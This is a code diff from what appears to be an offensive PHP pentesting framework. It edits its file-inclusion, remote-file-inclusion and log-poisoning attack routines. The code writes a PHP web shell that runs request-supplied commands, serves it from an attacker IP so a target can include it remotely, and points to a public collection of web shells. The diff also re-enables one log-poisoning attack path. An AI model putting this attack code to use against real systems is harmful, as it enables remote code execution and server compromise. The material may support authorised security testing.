@@ -118,8 +118,7 @@ public function fi2rfi($cmd,$filter){
 
     if($this->ip4priv($this->ip)) {
 	    $this->requette("echo \"<?php system(\\\$_REQUEST[\\\"cmd\\\"]);?>\" | tee $this->dir_tmp/rohff.txt " );
-	    //$open_server = "cd $this->dir_tmp; python -m SimpleHTTPServer $port "; $this->cmd("localhost",$open_server );
-	    //if (!$this->tcp2open($this->ip4addr4target($this->ip), $port)) {$this->rouge($open_server);exit();}
+	    $this->tcp2open4server($attacker_ip,$this->port_rfi);
 	    $php_backdoor_path = "http://$attacker_ip:$this->port_rfi/rohff.txt";
 	}
 	// https://raw.githubusercontent.com/JohnTroony/php-webshells/master/simple-backdoor.php
@@ -168,8 +167,9 @@ public function fi2lfi($cmd,$filter){
 public function fi2log_poisoning($cmd,$filter){
     $this->gtitre(__FUNCTION__);
     // for PHP and LINUX only
+    $this->ip2port();
     $this->fi2log4db($cmd,$filter);$this->pause(); // OK
-    //$this->fi2log4fd($cmd,$filter);$this->pause();
+    $this->fi2log4fd($cmd,$filter);$this->pause();
     $this->fi2log4ftp($cmd,$filter);$this->pause(); // OK
     //$this->fi2log4ssession($cmd,$filter);$this->pause();
     $this->fi2log4smtp($cmd,$filter);$this->pause(); // OK
@@ -204,7 +204,7 @@ public function fi4pentest($OS){
             
     }
     
-    return $this->req2BD4in("param2fi","URI",$this->uri2where,"1");
+    //return $this->req2BD4in("param2fi","URI",$this->uri2where,"1");
     }
 
 }
